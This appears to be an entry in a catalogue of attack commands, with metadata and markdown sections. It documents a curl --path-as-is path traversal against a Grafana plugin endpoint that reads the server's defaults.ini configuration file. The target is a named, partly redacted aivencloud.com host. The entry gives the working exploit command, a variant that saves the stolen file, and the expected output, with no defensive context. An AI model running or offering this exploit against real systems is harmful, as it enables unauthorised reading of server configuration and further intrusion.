---
id: cmd-curl-grafana-config
data: >-
  curl --path-as-is
  https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
tags:
  - path-traversal
  - config-read
type: command
output: |-
  [server]
  http_port = 3000
  ...
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.752Z'
verified: false
validated: true
submitted: true
---
# curl-path-as-is-grafana-config

## Command

```bash
curl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

## Description

Sends an HTTP GET request with --path-as-is to prevent path normalization, exploiting traversal to read Grafana's defaults.ini configuration file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --path-as-is | Disables curl's automatic path normalization | Yes |
| URL | Grafana URL with multiple '../' to config file | Yes |

## Examples

### Basic Usage

```bash
curl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

### Advanced Usage

With output to file:

```bash
curl --path-as-is -o config.ini https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

## Expected Output

INI-formatted Grafana configuration, e.g., [server] section with port and protocol settings.

## Related

- [[Related Procedure: Exploit-Path-Traversal-to-Read-Grafana-Config]]
